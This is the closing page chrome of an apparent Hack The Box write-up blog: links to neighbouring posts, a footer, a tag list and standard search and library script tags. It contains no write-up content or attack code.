OpenS...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBCarpediem/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Carpediem</p></a> <a href="/posts/HTBRedpanda/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Writeup Redpanda</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Marsello Guillén</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
